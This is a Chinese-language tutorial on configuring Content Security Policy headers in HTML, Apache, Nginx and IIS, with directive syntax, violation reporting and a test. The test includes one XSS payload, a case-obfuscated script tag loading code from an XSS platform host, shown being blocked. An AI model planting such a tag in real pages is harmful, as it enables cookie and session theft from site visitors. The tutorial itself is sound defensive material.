# 关于CSP
> 内容安全策略   (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。(摘自MDN web docs)

个人理解就是一种执行在浏览器端的页面安全策略，通过设置白名单允许页面内容来自指定的源，比如验证js脚本的来源来消除来自其他源的js脚本加载，这样就能防止xss远程加载js脚本。

# 相关配置
两种
## 直接在html页面中添加
示例：
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
## 配置服务器，使其在响应头添加
- Apache
在VirtualHost的httpd.conf文件或者.htaccess文件中加入以下代码
```
Header set Content-Security-Policy "default-src 'self';"
```
- Nginx
在 server {}对象块中添加如下代码
```
add_header Content-Security-Policy "default-src 'self';";
```
- IIS 
web.config:中添加
```
<system.webServer>

  <httpProtocol>

    <customHeaders>

      <add name="Content-Security-Policy" value="default-src 'self';" />

    </customHeaders>

  </httpProtocol>

</system.webServer>
```
这样response 头里面就会有Content-Security-Policy: 标签
```
Content-Security-Policy: script-src 'self'; object-src 'none';style-src cdn.example.org third-party.org; child-src https:
```

# 关于csp的语法（简单介绍）

## 默认限制
> 什么都不会就直接上一个默认限制就行了,例如`Content-Security-Policy: default-src 'self'`限制资源只能从本地加载，不管是js，还是图片，都只能从本地加载

## 详细的资源加载限制(摘自[知乎:阿里聚安全](https://www.zhihu.com/question/21979782/answer/122682029))
> 可以对每种资源进行详细的加载限制
- `script-src` 外部脚本加载限制
- `style-src` 样式表
- `img-src` 图像
- `media-src` 音频视频的加载
- `font-src` 字体文件
- `object-src`插件（比如 Flash）
- `child-src`框架
- `frame-ancestors`嵌入的外部资源（比如\<frame\>、\<iframe\>、\<embed\>和\<applet\>）
- `connect-src`HTTP 连接（通过 XHR、WebSockets、EventSource等）
- `worker-src` worker脚本
- `manifest-src` manifest 文件
> url相关
- `frame-ancestors` 限制嵌入框架的网页
- `base-uri` 限制 `<base#href>`
- `form-action` 限制 `<form#action>`
> 其他其他安全相关
- `block-all-mixed-content`：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）
- `upgrade-insecure-requests`：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议 相关类似的还有[HTTP Strict Transport Security](https://developer.mozilla.org/zh-CN/docs/Security/HTTP_Strict_Transport_Securityv)
- `plugin-types`：限制可以使用的插件格式
- `sandbox`：浏览器行为的限制，比如不能有弹出窗口等。

## 将违例内容进行反馈报告
> 需要在CSP规则中写明report-uri策略，然后参数中有一个地址接收这些报告，报告格式是json
大概写法事这个样子拿apache配置为例
```
Header set Content-Security-Policy "default-src 'self';report-uri http://12.12.12.12:7777"
```
返回的json大概如下：
```
{
    "csp-report":{
        "document-uri":"http://hhhhh.com/",
        "referrer":"",
        "violated-directive":"script-src-elem",
        "effective-directive":"script-src-elem",
        "original-policy":"default-src 'self';report-uri http://12.12.12.12:7777",
        "disposition":"enforce",
        "blocked-uri":"https://xss.pt/XUXds",
        "status-code":200,
        "script-sample":""
    }
}
```

# 测试
- 配置虚拟主机
```
<VirtualHost 12.12.12.12:80>
  DocumentRoot "/var/www/ipv4"
  ServerName    hhhhh.com
</VirtualHost>
Header set Content-Security-Policy "default-src 'self';"
```
重启apache服务，查看响应头是否含有Content-Security-Policy： default-src 'self';
- 到页面中加载远程脚本
<sCRiPt sRC=https://xss.pt/XUXdj></sCrIpT>
- 然后这时浏览器就会报错
 比如chrome：
```
Refused to load the script 'https://xss.pt/XUXdj' because it violates the following Content Security Policy http://hhhhhh.com directive: "default-src 'self'". Note that 'script-src-elem' was not explicitly set, so 'default-src' is used as a fallback.
```

相关文档：
- [MDN_web_docs-内容安全策略( CSP )](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [知乎-Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？](https://www.zhihu.com/question/21979782)
- [MDN_web_docs-HTTP Strict Transport Security](https://developer.mozilla.org/zh-CN/docs/Security/HTTP_Strict_Transport_Security)
- [阮一峰-Content Security Policy 入门教程](http://www.ruanyifeng.com/blog/2016/09/csp.html)
- [先知社区-如何巧妙绕过csp](https://xz.aliyun.com/t/2438) 感觉这个绕过思路就是通过iframe加载一些没有csp的页面，然后攻击父窗口，有